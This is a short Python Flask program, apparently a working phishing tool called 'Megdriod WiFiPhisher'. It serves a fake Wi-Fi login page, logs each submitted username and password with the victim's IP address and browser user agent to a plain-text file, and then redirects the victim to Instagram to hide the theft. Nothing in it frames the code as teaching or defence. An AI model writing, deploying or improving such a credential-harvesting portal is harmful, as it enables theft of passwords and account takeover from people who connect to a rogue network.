"""
Megdriod WiFiPhisher - Advanced Fake WiFi Login Portal
(Flask Version)
"""

import os
from datetime import datetime
from flask import Flask, render_template, request, redirect

app = Flask(__name__)
LOG_FILE = "creds.txt"


@app.route('/')
def index():
    """Render the fake Wi-Fi login page."""
    return render_template('login.html')


@app.route('/login', methods=['POST'])
@app.route('/login', methods=['POST'])
def login():
    """Capture credentials and log metadata, then show success page."""
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr
    ua = request.headers.get('User-Agent')

    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        f.write("=== Megdriod WiFiPhisher ===\n")
        f.write(f"[{datetime.now()}] IP: {ip} | UA: {ua}\n")
        f.write(f"Username: {username} | Password: {password}\n\n")

    # return render_template('success.html')


    return redirect("https://instagram.com")


# ...existing code...
if __name__ == '__main__':
    if not os.path.exists(LOG_FILE):
        open(LOG_FILE, 'w', encoding='utf-8').close()
    app.run(host='0.0.0.0', port=8000)
# ...existing code...